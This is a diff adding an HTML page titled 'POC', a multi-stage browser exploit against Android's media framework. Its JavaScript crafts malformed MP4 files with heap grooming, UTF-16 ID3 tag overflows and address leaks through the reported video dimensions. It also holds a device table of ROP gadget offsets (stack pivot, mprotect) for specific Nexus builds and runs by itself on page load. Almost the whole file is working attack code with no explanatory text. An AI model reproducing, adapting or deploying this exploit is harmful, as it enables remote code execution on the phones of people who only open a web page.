@@ -1,0 +1,798 @@
+<html>
+<head>
+    <title>POC</title>
+</head>
+<body>
+    <div id="log"></div>
+    <script>
+        if (!String.fromCodePoint) {
+            (function() {
+                var defineProperty = (function() {
+                    // IE 8 only supports `Object.defineProperty` on DOM elements
+                    try {
+                        var object = {};
+                        var $defineProperty = Object.defineProperty;
+                        var result = $defineProperty(object, object, object) && $defineProperty;
+                    } catch(error) {}
+                    return result;
+                }());
+                var stringFromCharCode = String.fromCharCode;
+                var floor = Math.floor;
+                var fromCodePoint = function(_) {
+                    var MAX_SIZE = 0x4000;
+                    var codeUnits = [];
+                    var highSurrogate;
+                    var lowSurrogate;
+                    var index = -1;
+                    var length = arguments.length;
+                    if (!length) {
+                        return '';
+                    }
+                    var result = '';
+                    while (++index < length) {
+                        var codePoint = Number(arguments[index]);
+                        if (
+                            !isFinite(codePoint) || // `NaN`, `+Infinity`, or `-Infinity`
+                            codePoint < 0 || // not a valid Unicode code point
+                            codePoint > 0x10FFFF || // not a valid Unicode code point
+                            floor(codePoint) != codePoint // not an integer
+                        ) {
+                            throw RangeError('Invalid code point: ' + codePoint);
+                        }
+                        if (codePoint <= 0xFFFF) { // BMP code point
+                            codeUnits.push(codePoint);
+                        } else { // Astral code point; split in surrogate halves
+                            // https://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae
+                            codePoint -= 0x10000;
+                            highSurrogate = (codePoint >> 10) + 0xD800;
+                            lowSurrogate = (codePoint % 0x400) + 0xDC00;
+                            codeUnits.push(highSurrogate, lowSurrogate);
+                        }
+                        if (index + 1 == length || codeUnits.length > MAX_SIZE) {
+                            result += stringFromCharCode.apply(null, codeUnits);
+                            codeUnits.length = 0;
+                        }
+                    }
+                    return result;
+                };
+                if (defineProperty) {
+                    defineProperty(String, 'fromCodePoint', {
+                        'value': fromCodePoint,
+                        'configurable': true,
+                        'writable': true
+                    });
+                } else {
+                    String.fromCodePoint = fromCodePoint;
+                }
+            }());
+        }
+
+        function log(s) {
+            var l = document.getElementById('log');
+            l.innerHTML += s + '<br/>';
+        }
+
+        function encode_utf8(s) {
+            return unescape(encodeURIComponent(s));
+        }
+
+        function decode_utf8(s) {
+            return decodeURIComponent(escape(s));
+        }
+
+        function encode_utf16be(str) {
+            var buf = new ArrayBuffer(str.length*2);
+            var bufView = new Uint16Array(buf);
+            for (var i=0, strLen=str.length; i < strLen; i++) {
+                bufView[i] = str.charCodeAt(i);
+            }
+            return bufView;
+        }
+
+        function utf16be_addr(addr) {
+            var buf = encode_utf16be(decode_utf8(String.fromCodePoint(addr&0xff) + String.fromCodePoint((addr>>8)&0xff) + String.fromCodePoint((addr>>16)&0xff) + String.fromCodePoint((addr>>24)&0xff)));
+
+            var out = new Uint8Array(buf.length*2);
+            for (var i = 0, j = 0; i < buf.length; i++) {
+                out[j++] = buf[i]>>8;
+                out[j++] = buf[i]&0xff;
+            }
+            return out;
+        }
+
+        function isLE() {
+            var v = new Uint16Array(1);
+            v[0] = 0x4142;
+            var d = new DataView(v.buffer);
+            if (d.getInt8(0) == 0x42) {
+                return true;
+            }
+            return false;
+        }
+
+        function str_to_array(str) {
+            var buf = new Uint8Array(str.length);
+            for (var i = 0; i < str.length; i++) {
+                buf[i] = str.charCodeAt(i);
+            }
+            return buf;
+        }
+
+        function is_utf8_addr(addr) {
+            if (addr < 0x80000000) {
+                return false;
+            }
+            var str = String.fromCodePoint(addr&0xff) + String.fromCodePoint((addr>>8)&0xff) + String.fromCodePoint((addr>>16)&0xff) + String.fromCodePoint((addr>>24)&0xff);
+            try {
+                decode_utf8(str);
+            } catch (error) {
+                return false; 
+            }
+            return true;
+        }
+
+        function atob64(buffer) {
+            var binary = '';
+            var bytes = new Uint8Array(buffer);
+            var len = bytes.byteLength;
+            for (var i = 0; i < len; i++) {
+                binary += String.fromCharCode(bytes[i]);
+            }
+            return window.btoa(binary);
+        }
+
+        function concat(a, b) {
+            var c = new Uint8Array(a.length + b.length);
+            c.set(a);
+            c.set(b, a.length);
+            return c;
+        }
+
+        function repeat(a, n) {
+            var r = new Uint8Array(a.length * n);
+            var i = 0;
+            var j = 0;
+            while (i < r.length) {
+                r[i] = a[j++];
+                if (j == (a.length)) {
+                    j = 0;
+                }
+                i++;
+            }
+            return r;
+        }
+
+        function zero(size) {
+            return repeat(new Uint8Array([0]), size);
+        }
+
+        function p32(d) {
+            var a = new Uint8Array(4);
+            a[0] = d&0xff;
+            a[1] = (d&0xff00)>>8;
+            a[2] = (d&0xff0000)>>16;
+            a[3] = (d&0xff000000)>>24;
+            return a;
+        }
+
+        function pb32(d) {
+            var a = new Uint8Array(4);
+            a[0] = (d&0xff000000)>>24;
+            a[1] = (d&0xff0000)>>16;
+            a[2] = (d&0xff00)>>8;
+            a[3] = d&0xff;
+            return a;
+        }
+
+        function chunk(tag, data) {
+            data = data || new Uint8Array();
+            return concat(pb32(data.length + 8), concat(tag, data));
+        }
+
+        function sample_table(data) {
+            data = data || new Uint8Array();
+            var stbl = new Uint8Array();
+            stbl = concat(stbl, chunk([0x73,0x74,0x63,0x6f], zero(8)));       // 'stco'
+            stbl = concat(stbl, chunk([0x73,0x74,0x73,0x63], zero(8)));       // 'stsc'
+            stbl = concat(stbl, chunk([0x73,0x74,0x73,0x7a], zero(12)));      // 'stsz'
+            stbl = concat(stbl, chunk([0x73,0x74,0x74,0x73], zero(8)));       // 'stts'
+            stbl = concat(stbl, data);
+            return chunk([0x73,0x74,0x62,0x6c], stbl);                        // 'stbl'
+        }
+
+        function memory_leak(size) {
+            var pssh = new Uint8Array([0x6c,0x65,0x61,0x6b]);                 // 'leak'
+            pssh = concat(pssh, repeat([0x4c], 16));                          // 'L' (uuid)
+            pssh = concat(pssh, pb32(size));                                  // data len
+            pssh = concat(pssh, repeat([0x4c], size));                        // 'L'
+            return chunk([0x70,0x73,0x73,0x68], pssh);                        // 'pssh'
+        }
+
+        function id3_integer(value) {
+            var output = new Uint8Array(4);
+            for (var i = 3; i >= 0; i--) {
+                output[i] = value&0x7f;
+                value >>= 7;
+            }
+            return output;
+        }
+
+        function id32_frame_size(value) {
+            var output = new Uint8Array(3);
+            for (var i = 2; i >= 0; i--) {
+                output[i] = value&0xff;
+                value >>= 8;
+            }
+            return output;
+        }
+
+        function id32(body) {
+            var id32 = repeat([0x41], 6);
+
+            // ID3v2.2 header
+            id32 = concat(id32, [0x49,0x44,0x33]);          // id ('ID3')
+            id32 = concat(id32, [0x02]);                    // version major
+            id32 = concat(id32, [0x02]);                    // version minor
+            id32 = concat(id32, [0x00]);                    // flags
+            id32 = concat(id32, id3_integer(body.length));  // size
+            id32 = concat(id32, body);
+            return chunk([0x49,0x44,0x33,0x32], id32);      // 'ID32'
+        }
+
+        function id32_tag(tag, contents, utf16) {
+            utf16 = utf16 || false;
+            var id32_tag = tag;
+            if (utf16) {
+                id32_tag = concat(id32_tag, id32_frame_size(1+contents.length));   // size
+                id32_tag = concat(id32_tag, [0x02]);                      // encoding == UTF16-BE
+                id32_tag = concat(id32_tag, contents);                    // bytes 
+                id32_tag = concat(id32_tag, zero(6));                     // count from the header
+            }
+            else {
+                id32_tag = concat(id32_tag, id32_frame_size(6+contents.length));   // size
+                id32_tag = concat(id32_tag, [0x00]);                // encoding = ISO 8859-1
+                id32_tag = concat(id32_tag, contents);              // bytes 
+                id32_tag = concat(id32_tag, zero(5));               // count from the header
+            }
+            return id32_tag;
+        }
+
+        function tkhd() {
+            return chunk([0x74,0x6b,0x68,0x64], zero(84));     // 'tkhd'
+        }
+
+        function mdhd() {
+            var mdhd = new Uint8Array();
+            mdhd = concat(mdhd, zero(4));                   // version
+            mdhd = concat(mdhd, repeat(0x50, 8));           // padding
+            mdhd = concat(mdhd, [0x00,0x00,0x00,0x01]);     // timescale
+            //mdhd = concat(mdhd, [0x00,0x09,0x10,0x00]);     // duration
+            mdhd = concat(mdhd, [0x00,0x00,0x00,0x00]);     // duration
+            mdhd = concat(mdhd, zero(2));                   // language
+            return chunk([0x6d,0x64,0x68,0x64], mdhd);      // 'mdhd'
+        }
+
+        function tenc() {
+            return chunk([0x74,0x65,0x6e,0x63], zero(32));  // 'tenc'
+        }
+
+        function mp4v() {
+            var mp4v = new Uint8Array();
+            mp4v = concat(mp4v, zero(24));
+            mp4v = concat(mp4v, repeat([0x41], 2));         // width
+            mp4v = concat(mp4v, repeat([0x42], 2));         // height 
+            mp4v = concat(mp4v, zero(50));
+            return chunk([0x6d,0x70,0x34,0x76], mp4v);      // 'mp4v'
+        }
+
+        function tx3g() {
+            return chunk([0x74,0x78,0x33,0x67], zero(20));  // 'tx3g'
+        }
+
+        function d263() {
+            return chunk([0x64,0x32,0x36,0x33], zero(7));   // 'd263'
+        }
+
+        function esds() {
+            return chunk([0x65,0x73,0x64,0x73], zero(8));   // 'esds'
+        }
+
+        function heap_mp4(data, extra_groom) {
+            // this boolean represents performing 'additional' grooming necessary
+            // on later versions of Android
+            extra_groom = extra_groom || false;
+
+            // 'ftyp'
+            var mp4 = chunk([0x66,0x74,0x79,0x70],[0x69,0x73,0x6f,0x6d,0x00,0x00,0x00,0x01,0x69,0x73,0x6f,0x6d]);
+           
+            // 'moov' 
+            mp4 = concat(mp4, chunk([0x6d,0x6f,0x6f,0x76]));
+
+            // defragment (num of heap sprays is a guess...)
+            mp4 = concat(mp4, repeat(memory_leak(0x80+16), 100)); 
+
+            // create placeholder allocations
+            // 'titl'
+            mp4 = concat(mp4, chunk([0x74,0x69,0x74,0x6c], repeat([0x41], 0x85+16)));
+            // 'perf'/'arti' (for some reason, this tag takes place of 'titl' in memory)
+            mp4 = concat(mp4, chunk([0x70,0x65,0x72,0x66], repeat([0x42], 0x85+16)));
+            if (extra_groom) {
+                // 'auth'/'writ'
+                mp4 = concat(mp4, chunk([0x61,0x75,0x74,0x68], repeat([0x43], 0x85+16)));
+                // fill temporary hole created when copying metadata tags 
+                mp4 = concat(mp4, memory_leak(0x80+16));
+            }
+
+            // make a hole at 'titl' for new KeyedVector from new MetaData object
+            mp4 = concat(mp4, chunk([0x74,0x69,0x74,0x6c], repeat([0x48], 20)));
+            if (extra_groom) {
+                // make a hole at 'writ'
+                mp4 = concat(mp4, chunk([0x61,0x75,0x74,0x68], repeat([0x48], 20)));
+            }
+
+            var trak = new Uint8Array();
+            trak = concat(trak, sample_table());
+            trak = concat(trak, tkhd());
+            trak = concat(trak, mp4v());
+
+            trak = concat(trak, chunk([0x68,0x76,0x63,0x43], data));               // 'hvcC'
+
+            // make new hole for overflow tag at 'perf'/'arti'
+            trak = concat(trak, chunk([0x70,0x65,0x72,0x66], repeat([0x48], 20)));
+
+            var overflow = zero(4); // 2 utf-8
+            overflow = concat(overflow, [0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x7f,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x41,0x00,0x41,0x00,0x41,0x00,0x41]);
+            overflow = concat(overflow, [0x00,0x41,0x00,0x41,0x00,0x41,0x00,0x41]); // 16
+
+            overflow = concat(overflow, [0x00,0x74,0x00,0x67,0x00,0x48,0x00,0x64]);
+            overflow = concat(overflow, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow = concat(overflow, [0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]); // 32
+
+            overflow = concat(overflow, [0x00,0x64,0x00,0x69,0x00,0x57,0x00,0x64]);
+            overflow = concat(overflow, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow = concat(overflow, [0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]); // 48
+
+            overflow = concat(overflow, [0x00,0x65,0x00,0x69,0x00,0x57,0x00,0x64]);
+            overflow = concat(overflow, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow = concat(overflow, [0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]); // 64
+
+            overflow = concat(overflow, [0x00,0x67,0x00,0x69,0x00,0x65,0x00,0x68]);
+            overflow = concat(overflow, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow = concat(overflow, [0x00,0x04,0x00,0x00,0x00,0x00]);           // 75
+
+            var overflow_tag = repeat([0x00,0x46], (144 - 28 - 48 - 6));    // 62 (31 utf-8)
+            overflow_tag = concat(overflow_tag, repeat([0xd8,0x41,0xd8,0x41,0xdc,0x41], 20)); // 32
+            overflow_tag = concat(overflow_tag, overflow);
+            // sizeof(overflow_tag) = 2 + 75 + 31 + 32 = 140 (0x8c)
+
+            // 'TCP'/'cpil'
+            trak = concat(trak, id32(id32_tag([0x54,0x43,0x50], overflow_tag, true)));
+
+            mp4 = concat(mp4, chunk([0x74,0x72,0x61,0x6b], trak));   // 'trak'
+
+            return mp4;
+        }
+
+        function fake_metadata_entry(key) {
+            var out = new Uint8Array();
+            for (var i = 0; i < key.length; i++) {
+                out = concat(out, [0x00,key[i]]);
+            }
+            out = concat(out, [0xd8,0x41,0xd8,0x41,0xdc,0x41]);
+            out = concat(out, [0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00]);
+            out = concat(out, [0xd8,0x41,0xd8,0x41,0xdc,0x41]);
+            return out;
+        }
+
+        function module_mp4(heap_address) {
+            // 'ftyp'
+            var mp4 = chunk([0x66,0x74,0x79,0x70],[0x69,0x73,0x6f,0x6d,0x00,0x00,0x00,0x01,0x69,0x73,0x6f,0x6d]);
+           
+            // 'moov' 
+            mp4 = concat(mp4, chunk([0x6d,0x6f,0x6f,0x76]));
+
+            // 'TAL'/'albu'
+            var tags = id32_tag([0x54,0x41,0x4c], repeat([0x23],20));
+            mp4 = concat(mp4, id32(tags));
+            // 'titl'
+            mp4 = concat(mp4, chunk([0x74,0x69,0x74,0x6c], repeat([0x41], 20)));
+            // 'perf'/'arti'
+            mp4 = concat(mp4, chunk([0x70,0x65,0x72,0x66], repeat([0x42], 20)));
+            // 'auth'/'writ'
+            mp4 = concat(mp4, chunk([0x61,0x75,0x74,0x68], repeat([0x43], 20)));
+            // 'gnre'/'genr' 
+            mp4 = concat(mp4, chunk([0x67,0x6e,0x72,0x65], repeat([0x44], 20)));
+
+            // defragment (num of heap sprays is a guess...)
+            mp4 = concat(mp4, repeat(memory_leak(0x80+16), 10));
+
+            // 'titl'
+            mp4 = concat(mp4, chunk([0x74,0x69,0x74,0x6c], repeat([0x41], 0x85+16)));
+            // 'perf'/'arti'
+            mp4 = concat(mp4, chunk([0x70,0x65,0x72,0x66], repeat([0x42], 0x85+16)));
+            // 'auth'/'writ'
+            mp4 = concat(mp4, chunk([0x61,0x75,0x74,0x68], repeat([0x43], 0x85+16)));
+            // 'gnre'/'genr' 
+            mp4 = concat(mp4, chunk([0x67,0x6e,0x72,0x65], repeat([0x44], 0x85+16)));
+
+            // fill temporary hole used for copying metadata field values 
+            mp4 = concat(mp4, memory_leak(0x80+16));
+
+            // make a hole for second MetaData entry
+            // 'perf'/'arti'
+            mp4 = concat(mp4, chunk([0x70,0x65,0x72,0x66], repeat([0x23], 20)));
+
+            var trak = new Uint8Array();
+            trak = concat(trak, mp4v());
+            trak = concat(trak, tkhd());
+
+            var overflow1 = repeat([0x00,0x41], 112);
+            overflow1 = concat(overflow1, repeat([0xd8,0x41,0xd8,0x41,0xdc,0x41], 8));
+            overflow1 = concat(overflow1, [0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow1 = concat(overflow1, [0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00]);
+            overflow1 = concat(overflow1, zero(16));
+
+            overflow1 = concat(overflow1, fake_metadata_entry([0x70,0x67,0x48,0x64]));
+            overflow1 = concat(overflow1, [0x00,0x71,0x00,0x67,0x00,0x48,0x00,0x64]);
+            overflow1 = concat(overflow1, [0xd8,0x41,0xd8,0x41,0xdc,0x41]);
+            overflow1 = concat(overflow1, [0x00,0x04,0x00,0x00,0x00,0x00]);
+
+            // make a hole for overflow buf by freeing 'titl' tag
+            trak = concat(trak, chunk([0x74,0x69,0x74,0x6c], repeat([0x23], 20)));
+            // 'TPA' -> 'dnum'
+            trak = concat(trak, id32(id32_tag([0x54,0x50,0x41], overflow1, true)));
+            // end of first overflow
+
+            // second overflow
+            trak = concat(trak, tkhd());
+            trak = concat(trak, tenc());
+            trak = concat(trak, d263());
+            trak = concat(trak, chunk([0x61,0x76,0x63,0x43], repeat([0x23], 20)));    // 'avcC'
+            trak = concat(trak, chunk([0x68,0x76,0x63,0x43], repeat([0x23], 20)));    // 'hvcC'
+
+            // make a hole for the sample table
+            // 'gnre'/'genr' 
+            trak = concat(trak, chunk([0x67,0x6e,0x72,0x65], repeat([0x44], 20)));
+            
+            // sample table
+            trak = concat(trak, chunk([0x73,0x74,0x62,0x6c]));  // 'stbl'
+
+            var overflow2 = repeat([0xd8,0x41,0xd8,0x41,0xdc,0x41], 36);
+            overflow2 = concat(overflow2, [0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow2 = concat(overflow2, [0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00]);
+            overflow2 = concat(overflow2, repeat([0xd8,0x41,0xd8,0x41,0xdc,0x41], 2));
+
+            overflow2 = concat(overflow2, [0x00,0x67,0x00,0x69,0x00,0x65,0x00,0x68]);
+            overflow2 = concat(overflow2, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow2 = concat(overflow2, [0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00]);
+            overflow2 = concat(overflow2, [0xd8,0x41,0xd8,0x41,0xdc,0x41]);
+
+            // junk tags
+            overflow2 = concat(overflow2, fake_metadata_entry([0x68,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x69,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6a,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6b,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6c,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6d,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6e,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x6f,0x69,0x65,0x68]));
+
+            // special entry
+            overflow2 = concat(overflow2, [0x00,0x70,0x00,0x69,0x00,0x65,0x00,0x68]);
+            overflow2 = concat(overflow2, utf16be_addr(heap_address));
+            overflow2 = concat(overflow2, zero(16));
+
+            // more junk tags
+            overflow2 = concat(overflow2, fake_metadata_entry([0x71,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x72,0x69,0x65,0x68]));
+            overflow2 = concat(overflow2, fake_metadata_entry([0x73,0x69,0x65,0x68]));
+
+            // fake height entry that will leak the pointer
+            overflow2 = concat(overflow2, [0x00,0x74,0x00,0x64,0x00,0x69,0x00,0x77]);
+            overflow2 = concat(overflow2, [0x00,0x32,0x00,0x33,0x00,0x6e,0x00,0x69]);
+            overflow2 = concat(overflow2, [0x00,0x04]);
+
+            // make hole at 'titl'
+            trak = concat(trak, id32(id32_tag([0x54,0x43,0x50], overflow2, true)));  // 'TCP'
+
+            // add a mime type (must do this)
+            // 'frma', 'mp4v'
+            trak = concat(trak, chunk([0x66,0x72,0x6d,0x61], [0x6d,0x70,0x34,0x76]));
+            trak = concat(trak, sample_table());
+            trak = concat(trak, tkhd());
+
+            // 'trak'
+            mp4 = concat(mp4, chunk([0x74,0x72,0x61,0x6b], trak));
+            return mp4;
+        }
+
+        function exploit_mp4(object_address) {
+            // 'ftyp'
+            var mp4 = chunk([0x66,0x74,0x79,0x70],[0x69,0x73,0x6f,0x6d,0x00,0x00,0x00,0x01,0x69,0x73,0x6f,0x6d]); 
+
+            // defragment (num of heap sprays is a guess...)
+            mp4 = concat(mp4, repeat(memory_leak(0x80+16), 10));
+            // 'titl'
+            mp4 = concat(mp4, chunk([0x74,0x69,0x74,0x6c], repeat([0x41], 0x85+16)));
+            // fill temporary hole used for copying 'titl' metadata field 
+            mp4 = concat(mp4, memory_leak(0x80+16));
+
+            var overflow = repeat([0x00,0x41], 127);
+            overflow = concat(overflow, repeat([0xd8,0x41,0xd8,0x41,0xdc,0x41], 4));
+            overflow = concat(overflow, [0x00,0x00]);
+            overflow = concat(overflow, [0x00,0x42,0x00,0x42,0x00,0x42,0x00,0x42]);
+            overflow = concat(overflow, [0x00,0x43,0x00,0x43,0x00,0x43,0x00,0x43]);
+            overflow = concat(overflow, utf16be_addr(object_address));
+
+            var trak = new Uint8Array();
+            var stbl = new Uint8Array();
+            // 'titl'
+            stbl = concat(stbl, chunk([0x74,0x69,0x74,0x6c], repeat([0x23], 20)));
+            // 'TAL'
+            stbl = concat(stbl, id32(id32_tag([0x54,0x41,0x4c], overflow, true)));
+            // 'stts'
+            stbl = concat(stbl, chunk([0x73,0x74,0x74,0x73], zero(8)));
+
+            // 'stbl'
+            trak = concat(trak, chunk([0x73,0x74,0x62,0x6c], stbl));
+
+            mp4 = concat(mp4, chunk([0x74,0x72,0x61,0x6b], trak));
+            return mp4;
+        }
+
+        function getModelAndBuildID() {
+            var userAgentStr = navigator.userAgent;
+            //var userAgentStr = "Mozilla/5.0 (Linux; Android 5.1.1; AOSP on HammerHead Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.6";
+            var re = /Android.*Build\/.{6}/g;
+            var match = re.exec(userAgentStr);
+            if (match.length == 1) {
+                var s = match[0];
+                var model = s.substring(s.indexOf(";")+2, s.indexOf("Build")-1);
+                var buildID = s.substr(s.indexOf("/")+1, 6);
+                return [model, buildID];
+            }
+            return undefined;
+        }
+
+        var devices_table = {
+            'AOSP on HammerHead': {
+                'LMY48B': {
+                    'extra_groom':      false,
+                    'vtable_offset':    0x1,
+                    'pivot_offset':     0x2,
+                    'pop_r0_pc_offset': 0x3,
+                    'mprotect_offset':  0x4
+                },
+                'MOB30Y': {
+                    'extra_groom':      true,
+                    'vtable_offset':    0x000bbf48,
+                    'pivot_offset':     0x00097034,
+                    'pop_r0_pc_offset': 0x00097cd8,
+                    'mprotect_offset':  0x0005bc00
+                }
+            }
+        }
+
+        var device_options = undefined;
+
+        function fake_vtable(heap_address, module_address) {
+            var base_address = module_address - device_options['vtable_offset'];
+            var pivot_address = base_address + device_options['pivot_offset'];
+            var mprotect_address = base_address + device_options['mprotect_offset'];
+
+            var vtable = repeat(p32(pivot_address), 8);
+            vtable = concat(vtable, p32(heap_address & 0xfffff000));
+            vtable = concat(vtable, p32(mprotect_address));
+
+            vtable = concat(vtable, [0x23,0x23,0x23,0x23]);
+            vtable = concat(vtable, p32(heap_address + 0x21));
+            return vtable;
+        }
+
+        // function fake_object(module_address, vtable_address) {
+        //     var base = module_address - device_options['vtable_offset'];
+        //     var pop_r0_pc = base + device_options['pop_r0_pc_offset'];
+
+        //     var obj = p32(vtable_address);
+        //     obj = concat(obj, p32(0x1000));     // size
+        //     obj = concat(obj, p32(0x7));        // prot
+        //     obj = concat(obj, zero(40));
+        //     obj = concat(obj, p32(vtable_address + 0x20));  // new sp?
+        //     obj = concat(obj, zero(4));
+        //     obj = concat(obj, p32(pop_r0_pc));
+        //     while (obj.length < 0x800) {
+        //         obj = concat(obj, [0x23]);
+        //     }
+        //     return obj;
+        // }
+
+        function fake_object(module_address, vtable_address) {
+            var base = module_address - device_options['vtable_offset'];
+            var pop_r0_pc = base + device_options['pop_r0_pc_offset'];
+
+            var obj = p32(vtable_address);
+            obj = concat(obj, p32(0x1000));     // size
+            obj = concat(obj, p32(0x7));        // prot
+            obj = concat(obj, zero(40));
+            obj = concat(obj, p32(vtable_address + 0x20));  // new sp?
+            obj = concat(obj, zero(4));
+            obj = concat(obj, p32(pop_r0_pc));
+            while (obj.length < 0x800) {
+                obj = concat(obj, [0x23]);
+            }
+            return obj;
+        }
+
+        function main() {
+            var dev_info = getModelAndBuildID();
+            if (dev_info == undefined) {
+                log('Could not enumerate device info, bailing...');
+                return;
+            }
+            // find the device ID and build ID in our devices table
+            var dev = dev_info[0];
+            var buildID = dev_info[1];
+
+            if (devices_table[dev] == undefined || devices_table[dev][buildID] == undefined) {
+                log('Device and/or build not in table, bailing...');
+                return;
+            }
+
+            device_options = devices_table[dev][buildID];
+            log('Device: ' + dev + ', BuildID: ' + buildID);
+            log('[*] firing stage1...');
+            stage1();
+        }
+
+        // let's cache the created mp4s to speed things up...
+        var heap_mp4_data = undefined;
+        var module_mp4_data = undefined;
+        var vtable_mp4_data = undefined;
+        var object_mp4_data = undefined;
+
+        main();
+
+        function stage1() {
+            var v = undefined;
+
+            function stage1_done() {
+                // short circuit for now...
+                //log('[*] short-circuit stage2...');
+                //stage2(0xb4c82000);
+                //return;
+
+                log(v.videoHeight.toString(16));
+                if (is_utf8_addr(v.videoHeight)) {
+                    log('[*] firing stage2...');
+                    stage2(v.videoHeight);
+                }
+                else {
+                    stage1();
+                }
+            }
+
+            var payload = repeat([0x00,0xa0,0xf0,0xf7], 0x200);
+            var v_mp4 = "data:video/mp4;base64,";
+            if (heap_mp4_data == undefined) {
+                heap_mp4_data = heap_mp4(payload, device_options["extra_groom"]);
+            }
+            v_mp4 += atob64(heap_mp4_data);
+            v = document.createElement('video');
+            var sourceMP4 = document.createElement('source'); 
+            sourceMP4.type = 'video/mp4';
+            sourceMP4.src = v_mp4;
+            v.onloadedmetadata = stage1_done;
+            v.autoplay = 'true';
+            v.appendChild(sourceMP4);
+            document.body.appendChild(v);
+        }
+
+        function stage2(heap_address) {
+            var v = undefined;
+        
+            function stage2_done() {
+                if (v.videoWidth != 0x4141 && v.videoWidth != 0) {
+                    log(v.videoWidth.toString(16));
+                    log('[*] firing stage3...');
+                    stage3(heap_address, v.videoWidth);
+                }
+                else {
+                    stage2(heap_address);
+                }
+            }
+
+            var v_mp4 = "data:video/mp4;base64,";
+            if (module_mp4_data == undefined) {
+                module_mp4_data = module_mp4(heap_address);
+            }
+            v_mp4 += atob64(module_mp4_data);
+            v = document.createElement('video');
+            var sourceMP4 = document.createElement('source'); 
+            sourceMP4.type = 'video/mp4';
+            sourceMP4.src = v_mp4;
+            v.onloadedmetadata = stage2_done;
+            v.autoplay = 'true';
+            v.appendChild(sourceMP4);
+            document.body.appendChild(v);
+        }
+
+        function stage3(heap_address, module_address) {
+            var v = undefined;
+
+            function stage3_done() {
+                if (v.videoHeight != 0x4242) {
+                    log(v.videoHeight.toString(16));
+                    log('[*] firing stage4...');
+                    stage4(module_address, v.videoHeight);
+                    return;
+                }
+                else {
+                    stage3(heap_address, module_address);
+                }
+            }
+
+            var v_mp4 = "data:video/mp4;base64,";
+            if (vtable_mp4_data == undefined) {
+                vtable_mp4_data = heap_mp4(fake_vtable(heap_address, module_address), device_options["extra_groom"]);
+            }
+            v_mp4 += atob64(vtable_mp4_data);
+            v = document.createElement('video');
+            var sourceMP4 = document.createElement('source'); 
+            sourceMP4.type = 'video/mp4';
+            sourceMP4.src = v_mp4;
+            v.onloadedmetadata = stage3_done;
+            v.autoplay = 'true';
+            v.appendChild(sourceMP4);
+            document.body.appendChild(v);
+        }
+
+        function stage4(module_address, vtable_address) {
+            var v = undefined;
+
+            function stage4_done() {
+                log(v.videoHeight.toString(16));
+
+                if (is_utf8_addr(v.videoHeight)) {
+                    log('[*] firing stage5...');
+                    stage5(v.videoHeight);
+                }
+                else {
+                    stage4(module_address, vtable_address);
+                }
+            }
+
+            var v_mp4 = "data:video/mp4;base64,";
+            if (object_mp4_data == undefined) {
+                object_mp4_data = heap_mp4(fake_object(module_address, vtable_address), device_options["extra_groom"]);
+            }
+            v_mp4 += atob64(object_mp4_data);
+            v = document.createElement('video');
+            var sourceMP4 = document.createElement('source'); 
+            sourceMP4.type = 'video/mp4';
+            sourceMP4.src = v_mp4;
+            v.onloadedmetadata = stage4_done;
+            v.autoplay = 'true';
+            v.appendChild(sourceMP4);
+            document.body.appendChild(v);
+        }
+
+        function stage5(object_address) {
+            var v = undefined;
+            var v_mp4 = "data:video/mp4;base64,";
+            v_mp4 += atob64(exploit_mp4(object_address));
+            v = document.createElement('video');
+            var sourceMP4 = document.createElement('source'); 
+            sourceMP4.type = 'video/mp4';
+            sourceMP4.src = v_mp4;
+            v.autoplay = 'true';
+            v.appendChild(sourceMP4);
+            document.body.appendChild(v);
+        }
+    </script>
+</body>
+</html>
